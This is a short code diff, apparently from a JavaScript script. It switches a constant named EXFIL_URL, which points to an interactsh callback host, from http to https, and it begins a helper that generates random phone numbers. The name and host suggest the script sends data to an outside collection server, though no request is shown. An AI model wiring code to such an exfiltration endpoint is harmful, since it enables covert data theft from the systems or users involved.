@@ -1,4 +1,4 @@
-const EXFIL_URL = "http://d7cdv6n1tt70g8jvhdl0nhntcih8gg1c4.interactsh-server.meeshogcp.in/";
+const EXFIL_URL = "https://d7cdv6n1tt70g8jvhdl0nhntcih8gg1c4.interactsh-server.meeshogcp.in/";
 
 function randomPhone() {
   return Math.floor(1000000000 + Math.random() * 9000000000).toString();
